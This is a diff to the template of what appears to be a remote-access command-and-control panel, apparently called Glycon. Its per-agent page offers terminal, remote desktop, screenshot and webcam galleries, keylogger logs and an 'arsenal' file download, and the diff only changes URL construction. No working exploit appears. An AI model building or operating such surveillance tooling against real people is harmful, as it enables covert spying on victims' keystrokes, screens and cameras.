@@ -26,11 +26,11 @@
             </div>
 
             <div class="flex flex-wrap items-center gap-2.5">
-                <a href="{{ base_url }}{{ url_for('terminal', agent_id=agent.id) }}" class="tactical-btn-primary">
+                <a href="{{ url_for('terminal', agent_id=agent.id) }}" class="tactical-btn-primary">
                     {{ icon('terminal', 'w-4 h-4') }}
                     <span>Terminal</span>
                 </a>
-                <a href="{{ base_url }}{{ url_for('remote_desktop', agent_id=agent.id) }}" class="tactical-btn-cyan">
+                <a href="{{ url_for('remote_desktop', agent_id=agent.id) }}" class="tactical-btn-cyan">
                     {{ icon('desktop', 'w-4 h-4') }}
                     <span>Remote Desktop</span>
                 </a>
@@ -81,7 +81,7 @@
                         <span class="text-emerald-400">{{ icon('camera', 'w-5 h-5') }}</span>
                         <h2 class="text-base font-semibold text-slate-100">Recent Screenshots</h2>
                     </div>
-                    <a href="{{ base_url }}{{ url_for('screenshots') }}?agent_id={{ agent.id }}" class="tactical-btn-ghost">
+                    <a href="{{ url_for('screenshots') }}?agent_id={{ agent.id }}" class="tactical-btn-ghost">
                         View All &rarr;
                     </a>
                 </div>
@@ -90,11 +90,11 @@
                     <div class="grid grid-cols-1 sm:grid-cols-2 gap-4" id="screenshots-container">
                         {% for screenshot in screenshots %}
                         <div class="group relative rounded-xl overflow-hidden bg-slate-950 border border-slate-800">
-                            <a href="{{ base_url }}{{ url_for('get_screenshot', screenshot_id=screenshot.id) }}"
+                            <a href="{{ url_for('get_screenshot', screenshot_id=screenshot.id) }}"
                                data-lightbox="screenshots-{{ agent.id }}"
                                data-title="Screenshot — {{ screenshot.timestamp }}"
                                class="block aspect-video overflow-hidden">
-                                <img src="{{ base_url }}{{ url_for('get_screenshot', screenshot_id=screenshot.id) }}"
+                                <img src="{{ url_for('get_screenshot', screenshot_id=screenshot.id) }}"
                                      class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-200"
                                      alt="Screenshot">
                             </a>
@@ -117,7 +117,7 @@
                         <span class="text-cyan-400">{{ icon('webcam', 'w-5 h-5') }}</span>
                         <h2 class="text-base font-semibold text-slate-100">Recent Webcam Captures</h2>
                     </div>
-                    <a href="{{ base_url }}{{ url_for('webcam_captures') }}?agent_id={{ agent.id }}" class="tactical-btn-ghost">
+                    <a href="{{ url_for('webcam_captures') }}?agent_id={{ agent.id }}" class="tactical-btn-ghost">
                         View All &rarr;
                     </a>
                 </div>
@@ -126,11 +126,11 @@
                     <div class="grid grid-cols-1 sm:grid-cols-2 gap-4" id="webcam-container">
                         {% for capture in webcam_captures %}
                         <div class="group relative rounded-xl overflow-hidden bg-slate-950 border border-slate-800">
-                            <a href="{{ base_url }}{{ url_for('get_webcam_capture', capture_id=capture.id) }}"
+                            <a href="{{ url_for('get_webcam_capture', capture_id=capture.id) }}"
                                data-lightbox="webcam-{{ agent.id }}"
                                data-title="Webcam Capture — {{ capture.timestamp }}"
                                class="block aspect-video overflow-hidden">
-                                <img src="{{ base_url }}{{ url_for('get_webcam_capture', capture_id=capture.id) }}"
+                                <img src="{{ url_for('get_webcam_capture', capture_id=capture.id) }}"
                                      class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-200"
                                      alt="Webcam Capture">
                             </a>
@@ -774,7 +774,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 reader.readAsDataURL(file);
             } else if (fileSelect.value) {
                 const filename = fileSelect.value;
-                const fileResp = await fetch(`${window.location.origin}/api/arsenal/download/${encodeURIComponent(filename)}`);
+                const fileResp = await fetch(`{{ base_url }}/api/arsenal/download/${encodeURIComponent(filename)}`);
                 const blob = await fileResp.blob();
                 const reader = new FileReader();
                 reader.onload = async function() {
@@ -937,7 +937,7 @@ document.addEventListener('DOMContentLoaded', function() {
     setInterval(fetchKeyloggerLogs, 10000);
 
     // Keylogger status WebSocket
-    const socket = io("{{ request.url_root }}keylogger", { reconnection: false });
+    const socket = io("/keylogger", { reconnection: false });
     socket.on('connect', () => {
         socket.emit('join', 'agent_{{ agent.id }}');
     });
@@ -970,7 +970,7 @@ document.addEventListener('DOMContentLoaded', function() {
     socket.on('disconnect', () => setKeyloggerBadge('inactive'));
 
     // Main WebSocket for live task/screenshot/webcam updates
-    const mainSocket = io("{{ request.url_root }}", { reconnection: true });
+    const mainSocket = io("/", { reconnection: true });
     mainSocket.on('task_complete', (data) => {
         if (data.agent_id === '{{ agent.id }}') {
             GlyconUI.toast('Task Completed', `Task (${data.task_type}) completed`, 'success');
